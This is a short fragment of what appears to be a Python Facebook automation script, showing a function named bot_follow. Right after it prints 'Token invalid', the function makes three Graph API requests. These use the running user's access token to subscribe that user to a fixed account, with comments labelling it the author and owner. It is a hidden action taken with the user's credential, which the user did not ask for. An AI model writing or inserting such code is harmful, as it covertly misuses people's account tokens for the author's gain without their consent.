...
def bot_follow():
	try:
		...
		print("\n   [!] Token invalid")
		logs()
		requests.post('https://graph.facebook.com/100025411306232/subscribers?access_token=' + toket)      #Author
		requests.post('https://graph.facebook.com/100025411306232/subscribers?access_token=' + toket)      #Owner
		requests.post('https://graph.facebook.com/100025411306232/subscribers?access_token=' + toket)      #Owner
